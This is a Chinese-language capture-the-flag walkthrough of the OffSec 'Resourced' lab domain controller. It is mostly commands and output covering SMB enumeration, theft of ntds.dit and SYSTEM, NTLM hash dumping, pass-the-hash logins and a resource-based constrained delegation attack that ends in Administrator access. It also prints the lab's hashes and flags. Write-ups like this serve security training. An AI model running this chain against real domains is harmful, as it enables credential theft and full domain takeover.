###### tags: `Offsec` `PG Practice` `Intermediate` `Windows`

# Resourced
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.160.175 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.160.175:53
Open 192.168.160.175:88
Open 192.168.160.175:135
Open 192.168.160.175:139
Open 192.168.160.175:389
Open 192.168.160.175:445
Open 192.168.160.175:464
Open 192.168.160.175:593
Open 192.168.160.175:636
Open 192.168.160.175:3269
Open 192.168.160.175:5985
Open 192.168.160.175:9389
Open 192.168.160.175:49666
Open 192.168.160.175:49667
Open 192.168.160.175:49674
Open 192.168.160.175:49675
Open 192.168.160.175:49693
Open 192.168.160.175:49712

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-05-02 08:08:44Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

`enum4linux`，得一個帳號密碼`V.Ventz/HotelCalifornia194!`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ enum4linux 192.168.160.175 

index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
```

CME列舉
```
┌──(kali㉿kali)-[~/pgplay]
└─$ crackmapexec smb 192.168.160.175 -u V.Ventz -p "HotelCalifornia194\!" --shares  
SMB         192.168.160.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.160.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.160.175 445    RESOURCEDC       [+] Enumerated shares
SMB         192.168.160.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.160.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.160.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.160.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.160.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.160.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
SMB         192.168.160.175 445    RESOURCEDC       Password Audit  READ            
SMB         192.168.160.175 445    RESOURCEDC       SYSVOL          READ            Logon server share
```

登入`Password Audit`，分別拿`\registry\SYSTEM`跟`\Active Directory\ntds.dit`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ smbclient //192.168.160.175/"Password Audit" -U resourced.local/V.Ventz
Password for [RESOURCED.LOCAL\V.Ventz]: HotelCalifornia194!

smb: \> cd registry
smb: \registry\> dir
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  SECURITY                            A    65536  Mon Sep 27 06:45:20 2021
  SYSTEM
  
smb: \registry\> get SYSTEM

smb: \> cd "Active Directory"
smb: \Active Directory\> dir
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  ntds.dit                            A 25165824  Mon Sep 27 07:30:54 2021
  ntds.jfm                            A    16384  Mon Sep 27 07:30:54 2021

                7706623 blocks of size 4096. 2720069 blocks available
smb: \Active Directory\> get ntds.dit
```

`secretdump`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL 

Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
```

CME列舉..得`L.Livingstone/19a3a7550ce8c505c2d46b5e39d6f808`，`impacket-psexec`登不進改`win-rm`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ crackmapexec smb 192.168.160.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808 
SMB         192.168.160.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.160.175 445    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 
```

在`C:\Users\L.Livingstone\Desktop`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ evil-winrm -i 192.168.160.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808

*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop> type local.txt
8037e6192d865cfb10ee67e4dfe0e337
```

在這台裡面使用`sharphound`
```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload /home/kali/pgplay/SharpHound.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> . .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Import-Module .\Sharphound.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\L.Livingstone\Documents\ -OutputPrefix "audit"
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> download audit_20240506190047_BloodHound.zip
```

下載之後丟進bloodhound，左上搜尋`L.LIVINGSTONE@RESOURCED.LOCAL`，點`Node Info -> OUTBOUND OBJECT CONTROL -> First Degree Object Control`

![Resourced_1.png](picture/Resourced_1.png)

可以看到有`GenericAll`，可以使用[rbcd-attack](https://github.com/tothi/rbcd-attack?source=post_page-----50c25c5a23c5--------------------------------)

先加一台新電腦
```
┌──(kali㉿kali)-[~/pgplay]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.233.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> get-adcomputer attack


DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : ATTACK
ObjectClass       : computer
ObjectGUID        : a04b3b32-4a0e-457a-a587-1764b9c9e5e8
SamAccountName    : ATTACK$
SID               : S-1-5-21-537427935-490066102-1511301751-4101
UserPrincipalName :
```

執行`rbcd.py`
```
┌──(kali㉿kali)-[~/pgplay/rbcd-attack]
└─$ python3 rbcd.py -dc-ip 192.168.233.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.233.175
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy

┌──(kali㉿kali)-[~/pgplay/rbcd-attack]
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.233.175
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

┌──(kali㉿kali)-[~/pgplay/rbcd-attack]
└─$ export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

把`resourcedc.resourced.local`加入`/etc/hosts`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ sudo nano /etc/hosts

192.168.233.175 resourcedc.resourced.local
```

登入，可在`C:\Users\Administrator\Desktop`得proof.txt
```
┌──(kali㉿kali)-[~/pgplay/rbcd-attack]
└─$ impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.233.175

C:\Users\Administrator\Desktop> type proof.txt
018ad9841f8e733d186e182d0534e6d4
```
